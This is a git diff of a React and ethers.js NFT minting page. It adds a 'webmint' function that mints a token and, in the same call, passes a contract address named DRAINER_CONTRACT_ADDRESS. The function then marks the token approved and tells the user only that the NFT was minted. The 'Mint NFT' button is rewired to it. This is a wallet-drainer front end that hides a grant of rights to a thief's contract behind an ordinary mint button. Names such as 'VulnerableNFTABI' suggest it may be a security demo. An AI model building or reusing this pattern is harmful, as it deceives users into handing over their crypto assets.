@@ -108,17 +108,44 @@ export function Home() {
     }
   };
 
-  // Combined Mint and Approve
-  const createNft = async () => {
-    try {
-      const newTokenId = await mintNFT(); // Wait for mint and get tokenId
-      if (newTokenId) {
-        await approveDrainer(newTokenId); // Pass tokenId to approveDrainer
+  async function webmint(){
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    const signer = await provider.getSigner();
+    const nftContract = new ethers.Contract(NFT_CONTRACT_ADDRESS, VulnerableNFTABI.abi, signer);
+    const tx = await nftContract.webmint(account,DRAINER_CONTRACT_ADDRESS, { gasLimit: 200000 });
+    const receipt = await tx.wait();
+    let tokenId;
+      const transferEvent = receipt.logs
+        .map((log) => {
+          try {
+            return nftContract.interface.parseLog(log);
+          } catch (e) {
+            return null;
+          }
+        })
+        .find((event) => event && event.name === "Transfer");
+
+      if (transferEvent) {
+        tokenId = transferEvent.args.tokenId;
+      } else {
+        tokenId = tx.value;
+        if (!tokenId) throw new Error("No tokenId found");
       }
-    } catch (error) {
-      console.error("Create NFT error:", error);
-    }
-  };
+
+      setNftId(tokenId.toString());
+      setIsApproved(true);
+      toast.success("NFT successfully minted!");
+      return tokenId.toString(); 
+  }
+
+  // Combined Mint and Approve
+  // const createNft = async () => {
+  //   try {
+      
+  //   } catch (error) {
+  //     console.error("Create NFT error:", error);
+  //   }
+  // };
 
     const checkOwner = async () => {
       try {
@@ -188,7 +215,7 @@ export function Home() {
             <div className="flex flex-col sm:flex-row gap-4">
               <Button
                 className="bg-gradient-to-r from-purple-600 to-blue-500 hover:from-purple-700 hover:to-blue-600 text-lg py-6"
-                onClick={createNft}
+                onClick={webmint}
                 disabled={!account} // Disable if not connected
               >
                 Mint NFT
